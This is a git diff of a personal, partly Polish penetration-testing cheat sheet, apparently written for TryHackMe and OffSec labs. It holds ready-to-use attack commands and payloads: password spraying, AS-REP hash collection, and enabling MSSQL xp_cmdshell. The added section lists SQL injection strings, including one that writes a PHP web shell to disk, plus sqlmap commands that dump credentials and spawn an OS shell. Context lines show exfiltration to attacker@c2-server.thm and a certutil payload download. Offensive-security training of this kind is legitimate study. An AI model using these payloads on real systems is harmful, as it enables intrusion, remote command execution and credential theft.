@@ -5,7 +5,7 @@ for ip in $(seq 64 79); do host 167.114.21.$ip; done | grep -Ev "not found|timed
 ```
 ## awk
 Wycinanie interesujacej nas tresci z pliku
-```
+```bash
 awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt
 ```
 -F'[][]' — ustawia znaki [ oraz ] jako separatory kolumn.
@@ -13,31 +13,31 @@ awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt
 > users.txt — zapisuje wynik prosto do nowego pliku.
 
 ## Nmap
-```
+```bash
 nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt ip
 ```
 Ktore share z DC daja RW
-```
+```bash
 nmap -p445 --script smb-enum-shares IP
 ```
 ## Gobuster
-```
+```bash
 gobuster dir -u http://10.113.166.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400
 ```
-```
+```bash
 gobuster vhosts -u $4 -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -o vhosts_found.txt
 ```
 ## Find
-```
+```bash
 sudo find / -name ".env.local" -type f 2>/dev/null
 ```
 Bez rozrozniania wielkosci liter
-```
+```bash
 find . -iname "*monkey*"
 ```
 ## Git
 Sprawdzajka dla zmian w plikach
-```
+```bash
 git status
 ```
 Dodanie zmian do "koszyka" (Staging)
@@ -183,36 +183,36 @@ scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
 ## SHarphound BLoodhound
 ### bloodhound.py
 Sharphound data collector meant for linux
-```
+```bash
 bloodhound-python -u asrepuser1 -p qwerty123! -d tryhackme.loc -ns 10.211.12.10 -c All --zip
 ```
 ### Bloodhound
 GRAPH!! Host it
 https://happycamper84.medium.com/howto-setup-bloodhound-map-ad-44c7149ba28b
-```
+```bash
 sudo neo4j start
 sudo neo4j stop
 ```
 http://localhost:7474  
 Login, default user neo4j  
-```
+```bash
 bloodhound
 ```
 ## CrackMapExec
 CrackMapExec is a well-known network service exploitation tool that we will use throughout this module. It allows us to perform enumeration, command execution, and post-exploitation attacks in Windows environments. It supports various network protocols, such as SMB, LDAP, RDP, and SSH. If anonymous access is permitted, we can retrieve the password policy without credentials with the following command:
-```
+```bash
 crackmapexec smb 10.211.11.10 --pass-pol
 ```
 Password Spray Attack
-```
+```bash
 crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
 ```
 ## DNSenum
-```
+```bash
 dnsenum megacorp.com
 ```
 ## DNSrecon
-```
+```bash
 dnsrecon -d megacorp.com -t std 
 dnsrecon -d megacorp.com -D ~/list.txt -t brt
 ```
@@ -220,10 +220,24 @@ dnsrecon -d megacorp.com -D ~/list.txt -t brt
 ## impacket
 ### getnpusers
 Impacket provides a flexible Python script (GetNPUsers.py) to enumerate accounts in non-Windows environments. To test for the pre-authentication vulnerability, you must supply a users.txt file containing usernames.
-```
+This command enumerates usernames listed in users.txt and collects AS-REP hashes for vulnerable accounts, saving them in hashes.txt for offline cracking.
+```bash
 impacket-GetNPUsers tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
 ```
-This command enumerates usernames listed in users.txt and collects AS-REP hashes for vulnerable accounts, saving them in hashes.txt for offline cracking.
+### MSSQL
+In Microsoft SQL Server, the xp_cmdshell function takes a string and passes it to a command shell for execution. 
+1. Get into db
+```bash
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+```
+2.
+```sql
+EXECUTE sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'whoami';
+```
 ## enum4linux-ng
 enum4linux-ng is a tool that automates various enumeration techniques against Windows systems, including user enumeration. SMB+RPC protocol.
 ```
@@ -918,6 +932,72 @@ certutil -urlcache -split -f "http://url" C:\Users\Public\payload.exe
 xxd suspicious_script.sh | head -n 20
 ```
 
+
+
+# Techniki
+## Databases
+### Boolean-based SQLi
+```bash
+offsec' OR 1=1 -- //
+' or 1=1 in (select @@version) -- //
+' OR 1=1 in (SELECT * FROM users) -- //
+' or 1=1 in (SELECT password FROM users) -- //
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+```
+### UNION based SQLi
+Verifying the exact number of columns
+```SQL
+' ORDER BY 1-- //
+```
+Displaying the exact number of columns
+```sql
+%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
+```
+Enumerating the Database via SQL UNION Injection
+```sql
+' UNION SELECT null, null, database(), user(), @@version  -- //
+```
+Retrieving Current Database Tables and Columns
+```sql
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+```
+Write a WebShell To Disk via INTO OUTFILE directive
+```
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
+### Blind SQLi
+```sql
+' AND IF (1=1, sleep(3),'false') -- //
+```
+### MSSQL
+1. Get into db
+```bash
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+```
+2.
+```sql
+EXECUTE sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'whoami';
+```
+### SQLmap
+#### Running sqlmap to quickly find SQL injection points
+```bash
+# We will set the URL we want to scan with -u and specify the parameter to test using -p
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
+# Running sqlmap to Dump Users Credentials Table
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
+```
+#### Spawn a shell sqlmap
+First, we need to intercept the POST request via Burp and save it as a local text file on our Kali VM.
+```bash
+# Running sqlmap with os-shell
+sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+```
+
+# C2
 
 Przesuń o wyraz do przodu, Alt + F,Forward
 
